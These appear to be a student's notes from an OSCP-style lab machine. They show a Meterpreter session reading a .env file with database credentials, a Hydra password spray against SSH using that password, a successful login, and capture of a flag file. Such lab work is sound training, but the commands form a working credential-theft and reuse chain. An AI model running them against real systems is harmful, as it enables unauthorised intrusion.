
![[Pasted image 20250814125010.png]]![[Pasted image 20250814125209.png]]![[Pasted image 20250814125921.png]]![[Pasted image 20250814130705.png]]![[Pasted image 20250814131122.png]]![[Pasted image 20250814131251.png]]![[Pasted image 20250814131725.png]]
meterpreter > cd .env
[-] stdapi_fs_chdir: Operation failed: 1
meterpreter > type .env
[-] Unknown command: type. Run the help command for more details.
meterpreter > cat .env
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=development
DB_USERNAME=web_admin
DB_PASSWORD=1amD3vM@ch1n3!
![[Pasted image 20250814134015.png]]![[Pasted image 20250814140213.png]]![[Pasted image 20250814140235.png]]hydra -L user.txt -p 1amD3vM@ch1n3! ssh://192.168.107.112
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-14 04:29:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 17 login tries (l:17/p:1), ~2 tries per task
[DATA] attacking ssh://192.168.107.112:22/
[22][ssh] host: 192.168.107.112   login: gari   password: 1amD3vM@ch1n3!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-14 04:29:53

┌──(kali㉿kali)-[~/oscp/mac_oscp]
└─$ ssh gari@192.168.107.112
gari@192.168.107.112's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-67-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Aug 14 08:29:49 AM UTC 2025

  System load:  0.080078125        Processes:               341
  Usage of /:   43.8% of 18.53GB   Users logged in:         1
  Memory usage: 23%                IPv4 address for ens192: 192.168.107.112
  Swap usage:   0%


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.                                                                                                                                                                                                       
                                                                                                                                                                                                                                            
Enable ESM Apps to receive additional future security updates.                                                                                                                                                                              
See https://ubuntu.com/esm or run: sudo pro status                                                                                                                                                                                          

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Aug 14 08:03:04 2025 from 192.168.49.107
gari@oscp:~$ ls
local.txt
gari@oscp:~$ whoami && hostname && ifconfig && type local.txt
gari
oscp
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.107.112  netmask 255.255.255.0  broadcast 192.168.107.255
        ether 00:50:56:8a:fd:2a  txqueuelen 1000  (Ethernet)
        RX packets 745964  bytes 112475786 (112.4 MB)
        RX errors 0  dropped 768  overruns 0  frame 0
        TX packets 747426  bytes 331081261 (331.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 214  bytes 20619 (20.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 214  bytes 20619 (20.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

-bash: type: local.txt: not found
gari@oscp:~$ ls
local.txt
gari@oscp:~$ whoami && hostname && ifconfig && cat local.txt
gari
oscp
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.107.112  netmask 255.255.255.0  broadcast 192.168.107.255
        ether 00:50:56:8a:fd:2a  txqueuelen 1000  (Ethernet)
        RX packets 746028  bytes 112480932 (112.4 MB)
        RX errors 0  dropped 770  overruns 0  frame 0
        TX packets 747462  bytes 331087069 (331.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 214  bytes 20619 (20.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 214  bytes 20619 (20.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ee1e0e53efc72d624d8644e58e386520
![[Pasted image 20250814145039.png]]![[Pasted image 20250814150908.png]]